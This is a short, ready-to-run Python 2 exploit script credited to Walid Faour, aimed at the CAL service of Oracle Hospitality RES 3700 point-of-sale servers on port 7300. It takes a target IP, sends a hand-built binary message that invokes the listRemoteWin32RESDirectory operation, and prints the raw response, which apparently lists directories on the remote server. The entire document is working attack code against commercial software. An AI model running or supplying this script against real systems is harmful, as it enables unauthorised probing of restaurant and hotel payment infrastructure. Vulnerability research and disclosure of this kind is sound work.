#Author: Walid Faour
#Date: Feb. 25, 2020
#Oracle Hospitality RES 3700 CAL Service Exploit

import socket
import binascii

print 
print 'Oracle Hospitality RES 3700 CAL Service Exploit'
print 'Using listRemoteWin32RESDirectory method/operation...'
print 

TCP_IP = raw_input("Enter remote Oracle Server IP address: ")
TCP_PORT = 7300
BUFFER_SIZE = 5000

header1 = "0201"
type = "46"
header2 = "00c0a801"
unknown1 = "03"
node = binascii.hexlify("TST192P01") + "00" #Do note change
halfnode = binascii.hexlify("T192P0")
node_padding = "0000000000000001"
unknown2 = "02000000"
seq = "040202000032"
crc8_checksum = "fc"
service = binascii.hexlify("Win32RES")
null_terminator = "000000000000000000"
MESSAGE = header1 + type + header2 + unknown1 + node + halfnode + unknown2 + crc8_checksum + seq + node + node_padding + service + null_terminator
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
s.send(binascii.unhexlify(MESSAGE))
data = s.recv(BUFFER_SIZE)
s.close()

print "Received RAW data:", data

				